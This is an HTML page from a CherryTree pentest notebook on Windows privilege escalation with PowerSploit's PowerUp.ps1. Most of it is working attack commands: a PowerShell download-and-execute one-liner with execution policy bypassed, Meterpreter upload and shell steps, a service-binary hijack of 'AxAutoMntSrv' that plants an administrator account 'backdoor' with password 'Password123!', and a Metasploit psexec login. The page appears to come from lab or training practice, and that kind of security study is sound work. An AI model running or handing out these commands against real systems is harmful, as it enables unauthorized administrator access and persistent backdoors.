<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Create a new Admin User</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Create a new Admin User</h1><br/><strong>3. Run PowerUp.ps1 script and create a new Administrator account</strong> <br />    Site: <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a><br />    *If we want we can also upload a payload(created with msfvenom) on the target machine<br />   ◇ <strong>Alternative 1: One-Line without download PowerUp.ps1 on the target machine &lt;---------</strong><br />       <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>danie<span style="color:#ff9d00;font-weight:700">\</span>Desktop&gt; powershell.exe <span style="color:#ff9d00;font-weight:700">-</span>exec bypass <span style="color:#ff9d00;font-weight:700">-</span>Command <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadstring(<span style="color:#333333;font-weight:400">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 &#39;</span>);<span style="color:#00117f;font-weight:400">Invoke-AllChecks</span>;<span style="color:#ff9d00;font-weight:700">Write-</span>ServiceBinary <span style="color:#333333;font-weight:400">-Name</span> <span style="color:#333333;font-weight:400">&#39;AxAutoMntSrv&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#333333;font-weight:400">&#39;C:\Program Files\Alcohol Soft\Alcohol.exe&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>UserName backdoor <span style="color:#ff9d00;font-weight:700">-</span>Password Password123<span style="color:#ff9d00;font-weight:700">!</span></pre></div><br />   ◇ <strong>Alternative 2: Upload PowerUp.ps1 and run it with Powershell on the target machine</strong><br />    Download locally only the script file PowerUp.ps1 that we need<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop# <span style="color:#ff9d00;font-weight:700">wget</span> https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>PowerShellMafia<span style="color:#ff9d00;font-weight:700">/</span>PowerSploit<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>Privesc<span style="color:#ff9d00;font-weight:700">/</span>PowerUp.ps1</pre></div> <div class="codebox"><pre>meterpreter &gt; upload <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>PowerUp.ps1 .        <span style="color:#0088ff;font-weight:400">#upload PowerUp.ps1 on the target machine in the current folder of the target machine (.)</span><br />meterpreter &gt; load powershell                                <span style="color:#0088ff;font-weight:400">#load powershell extension</span><br />meterpreter &gt; powershell_shell                               <span style="color:#0088ff;font-weight:400">#run powershell</span><br /><span style="color:#ff9d00;font-weight:700">PS</span> &gt; <span style="color:#ff9d00;font-weight:700">pwd</span><br /><span style="color:#ff9d00;font-weight:700">PS</span> &gt; <span style="color:#ff9d00;font-weight:700">Import-Module</span> .<span style="color:#ff9d00;font-weight:700">\</span>PowerUp.ps1<br /><span style="color:#ff9d00;font-weight:700">PS</span> &gt; <span style="color:#00117f;font-weight:400">invoke-AllChecks</span>                                        <span style="color:#0088ff;font-weight:400">#runs all current escalation checks and returns a report</span><br /><span style="color:#ff9d00;font-weight:700">PS</span> &gt; <span style="color:#ff9d00;font-weight:700">Write-</span>ServiceBinary <span style="color:#333333;font-weight:400">-Name</span> <span style="color:#333333;font-weight:400">&#39;AxAutoMntSrv&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#333333;font-weight:400">&#39;C:\Program Files\Alcohol Soft\Alcohol.exe&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>UserName backdoor <span style="color:#ff9d00;font-weight:700">-</span>Password Password123<span style="color:#ff9d00;font-weight:700">!</span> <span style="color:#0088ff;font-weight:400">#add Alcohol.exe</span></pre></div><br />       This writes a file called C:\Program Files\Alcohol Soft\Alcohol.exe&#39; that will be run with LocalSystem privileges when the service restarts. <br />       Writing the malicious file won&#39;t interrupt the service if it&#39;s running, but when the service restarts, Windows will execute the malicious file instead of the legitimate file<br />       At the next restart of the service AxAutoMntMntSrv or at a restart of the target computer a new Administrator account will be created with the credential spcified:<br />       username: “backdoor”<br />       password: &quot;Password123!&quot;<br />   ◇ <strong>Alternative 3: Upload PowerUp.ps1 without start a shell Powershell</strong>: <br />    Download locally only the script file PowerUp.ps1 that we need<strong><br />    </strong><div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop# <span style="color:#ff9d00;font-weight:700">wget</span> https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>PowerShellMafia<span style="color:#ff9d00;font-weight:700">/</span>PowerSploit<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>Privesc<span style="color:#ff9d00;font-weight:700">/</span>PowerUp.ps1</pre></div> <div class="codebox"><pre>meterpreter &gt; upload <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>PowerUp.ps1 .        <span style="color:#0088ff;font-weight:400">#upload PowerUp.ps1 on the target machine in the current folder of the target machine (.)</span><br />meterpreter &gt; shell<br />C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>danie<span style="color:#ff9d00;font-weight:700">\</span>Desktop&gt; powershell.exe <span style="color:#ff9d00;font-weight:700">-</span>exec bypass <span style="color:#ff9d00;font-weight:700">-</span>Command <span style="color:#3ad900;font-weight:400">&quot;&amp; {Import-Module .\PowerUp.ps1; Invoke-AllChecks}&quot;</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>danie<span style="color:#ff9d00;font-weight:700">\</span>Desktop&gt; powershell.exe <span style="color:#ff9d00;font-weight:700">-</span>exec bypass <span style="color:#ff9d00;font-weight:700">-</span>Command <span style="color:#3ad900;font-weight:400">&quot;&amp; {Import-Module .\PowerUp.ps1;Write-ServiceBinary -Name &#39;AxAutoMntSrv&#39; -Path &#39;C:\Program Files\Alcohol Soft\Alcohol.exe&#39; -UserName backdoor -Password Password123!}&quot;</span></pre></div><br /><br />4. We can restart the service, in this way the new Administrator “backdoor” is created<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\d</span>anie<span style="color:#333333;font-weight:400">\D</span>esktop&gt; sc start &lt;service&gt;</pre></div>  <br />    <span style="color:#a5452a;">example:</span><br />    To start the service as the login user we need that <span style="color:#ff0000;">CanRestart</span> on the PowerUp.ps1 output is “True”. In our scenario is False so we cannot do that, only for demonstration in the examples below we have started the service as Administrator. In a Real Testing anyway this wouldn&#39;t make much sense because become “Administrator” is our final purpose of this exploit!<br />    <code>sc start AxAutoMntSrv</code><br /><br /><strong>5. Check if the new account is been created</strong><br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>danie<span style="color:#ff9d00;font-weight:700">\</span>Desktop&gt; net localgroup Administrators</pre></div><br />    <a href=""><img src="images/1322-1.png" alt="images/1322-1.png" /></a><br /><br /><strong>6. To login now as Administrator &quot;backdoor&quot; user we can use</strong><br />    <div class="codebox"><pre>msf &gt; use exploit<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>smb<span style="color:#ff9d00;font-weight:700">/</span>psexec<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> RHOSTS <span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">1.120</span><br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> SMBPass Password123<span style="color:#ff9d00;font-weight:700">!</span><br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> SMBUser backdoor<br />msf &gt; run</pre></div><br />    <a href=""><img src="images/1322-2.png" alt="images/1322-2.png" /></a><br /><br /><strong>7. Clean Up (optional)</strong><br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">del</span> <span style="color:#3ad900;font-weight:400">&quot;C:\Program Files\Alcohol Soft\Alcohol.exe&quot;</span></pre></div><br /></div>
</body>
</html>
